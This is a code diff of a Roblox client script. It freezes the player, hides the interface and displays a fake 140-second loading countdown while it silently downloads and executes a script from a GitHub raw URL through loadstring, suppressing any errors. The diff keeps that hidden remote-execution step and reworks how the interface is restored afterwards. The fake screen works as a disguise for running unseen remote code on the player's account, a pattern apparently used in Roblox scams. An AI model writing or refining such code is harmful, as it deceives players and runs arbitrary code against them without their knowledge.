@@ -2,28 +2,29 @@ local player = game.Players.LocalPlayer
 local countdownTime = 140
 local uis = game:GetService("UserInputService")
 
--- === STEP 1: Block movement + UI ===
-for _, gui in pairs(player:WaitForChild("PlayerGui"):GetChildren()) do
+-- Save original enabled states of GUIs
+local playerGui = player:WaitForChild("PlayerGui")
+local guiStates = {}
+for _, gui in pairs(playerGui:GetChildren()) do
     if gui:IsA("ScreenGui") then
+        guiStates[gui] = gui.Enabled
         gui.Enabled = false
     end
 end
 
-local function freezeCharacter()
-    local char = player.Character or player.CharacterAdded:Wait()
-    if char:FindFirstChildOfClass("Humanoid") then
-        local humanoid = char:FindFirstChildOfClass("Humanoid")
-        humanoid.WalkSpeed = 0
-        humanoid.JumpPower = 0
-        humanoid.PlatformStand = true
-    end
+local char = player.Character or player.CharacterAdded:Wait()
+local humanoid = char:FindFirstChildOfClass("Humanoid")
+if humanoid then
+    humanoid.WalkSpeed = 0
+    humanoid.JumpPower = 0
+    humanoid.PlatformStand = true
 end
 
 local cam = workspace.CurrentCamera
 cam.CameraType = Enum.CameraType.Scriptable
 
--- === STEP 2: Create fullscreen loading GUI ===
-local loadingGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+-- Create loading screen GUI
+local loadingGui = Instance.new("ScreenGui", playerGui)
 loadingGui.Name = "FullLoadingScreen"
 loadingGui.IgnoreGuiInset = true
 loadingGui.ResetOnSpawn = false
@@ -51,33 +52,27 @@ label.TextScaled = true
 label.Font = Enum.Font.SourceSans
 label.Text = "Loading: " .. countdownTime
 
--- === STEP 3: Load your GitHub script silently ===
+-- Run your script silently
 spawn(function()
     pcall(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/boomboxmisscal/test/refs/heads/main/test"))()
     end)
 end)
 
--- === STEP 4: Run countdown ===
-freezeCharacter()
-
 for i = countdownTime, 1, -1 do
     label.Text = "Loading: " .. i
     wait(1)
 end
 
--- === STEP 5: Restore everything and close shop GUI ===
 loadingGui:Destroy()
 
-local playerGui = player:WaitForChild("PlayerGui")
-for _, gui in pairs(playerGui:GetChildren()) do
-    if gui:IsA("ScreenGui") and gui.Name:lower():find("shop") then
-        gui.Enabled = false
+-- Restore original GUI enabled states
+for gui, wasEnabled in pairs(guiStates) do
+    if gui and gui.Parent then -- check still valid
+        gui.Enabled = wasEnabled
     end
 end
 
-local char = player.Character or player.CharacterAdded:Wait()
-local humanoid = char:FindFirstChildOfClass("Humanoid")
 if humanoid then
     humanoid.WalkSpeed = 16
     humanoid.JumpPower = 50
@@ -86,8 +81,6 @@ end
 
 cam.CameraType = Enum.CameraType.Custom
 
-for _, gui in pairs(playerGui:GetChildren()) do
-    if gui:IsA("ScreenGui") then
-        gui.Enabled = true
-    end
-end
+-- Enable input back just in case
+uis.ModalEnabled = false
+uis.OverrideMouseIconBehavior = Enum.OverrideMouseIconBehavior.None
